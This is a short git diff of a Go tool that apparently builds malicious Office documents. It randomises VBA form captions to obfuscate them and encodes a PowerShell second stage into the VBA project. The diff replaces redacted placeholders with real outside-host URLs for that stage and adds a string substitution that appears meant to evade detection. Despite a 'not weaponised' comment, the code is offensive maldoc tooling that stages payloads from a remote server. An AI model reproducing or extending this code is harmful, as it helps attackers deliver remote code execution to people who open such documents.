@@ -163,8 +163,10 @@ func main() {
 	newForm.SetProperty("Caption", obf.RandWord())
 
 	// Setup second stage, not weaponised
-	resources.Payload = fmt.Sprintf(resources.Payload, "[REDACTED]", "[REDACTED]")
+	resources.Payload = fmt.Sprintf(resources.Payload, "https://oxis.io/web/a", "https://oxis.io/web/p")
 	b64Payload, _ := newEncodedPSScript(resources.Payload)
+	// Using varMap because of Drim PowershellCopy, this is to replace all occurence of that string.
+	resources.PSPayload = strings.ReplaceAll(resources.PSPayload, "powershellCopy", varMap["powershellCopy"])
 	finalPayload := fmt.Sprintf(resources.PSPayload, b64Payload)
 
 	// this map contains TextBox, Label and the payload, each associated to an encoded string. strMap["Label"][0] refers to "Label0" inside the VBA project.
